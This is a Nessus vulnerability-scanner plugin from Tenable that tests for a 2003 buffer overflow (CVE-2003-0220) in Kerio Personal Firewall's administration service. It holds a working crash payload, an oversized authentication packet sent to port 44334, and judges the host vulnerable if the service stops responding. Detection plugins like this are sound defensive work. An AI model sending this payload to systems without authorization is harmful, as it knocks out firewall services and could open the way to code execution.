#
# (C) Tenable Network Security, Inc.
#

# Exploit string by Core Security Technologies
#
# References:
# Date: Mon, 28 Apr 2003 15:34:27 -0300
# From: "CORE Security Technologies Advisories" <advisories@coresecurity.com>
# To: "Bugtraq" <bugtraq@securityfocus.com>, "Vulnwatch" <vulnwatch@vulnwatch.org>
# Subject: CORE-2003-0305-02: Vulnerabilities in Kerio Personal Firewall
#
# From: SecuriTeam <support@securiteam.com>
# Subject: [EXPL] Vulnerabilities in Kerio Personal Firewall (Exploit)
# To: list@securiteam.com
# Date: 18 May 2003 21:03:11 +0200
#
# Changes by rd : uncommented the recv() calls and tested it.
#

include("compat.inc");

if (description)
{
  script_id(11575);
  script_version("$Revision: 1.18 $");
  script_cvs_date("$Date: 2016/10/27 15:03:54 $");

  script_cve_id("CVE-2003-0220");
  script_bugtraq_id(7180);
  script_osvdb_id(6294);

  script_name(english:"Kerio Personal Firewall Administrator Authentication Handshake Packet Remote Buffer Overflow");
  script_summary(english:"Buffer overflow on KPF administration port");

  script_set_attribute(attribute:"synopsis", value:"The remote service is affected by a buffer overflow vulnerability.");
  script_set_attribute(attribute:"description", value:
"Kerio Personal Firewall is vulnerable to a buffer overflow attack
involving the administrator authentication process. An attacker may
use this to crash Kerio or to execute arbitrary code on the system.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2003/Apr/358");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Kerio Firewall 2.1.4 Authentication Packet Overflow');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2003/04/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2003/05/06");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:kerio:personal_firewall");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");
  script_family(english:"Firewalls");

  #script_dependencie("find_service1.nasl");
  script_require_keys("Settings/ParanoidReport");    
  script_require_ports("Services/kerio", 44334);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = 44334;		# Default port
if (! get_port_state(port)) exit(0);

soc = open_sock_tcp(port);
if (! soc) exit(0);

b = recv(socket: soc, length: 10);
b = recv(socket: soc, length: 256);
expl = raw_string(0x00, 0x00, 0x14, 0x9C);
expl += crap(0x149c);
send(socket: soc, data: expl);
close(soc);

soc = open_sock_tcp(port);
if (! soc) security_hole(port);
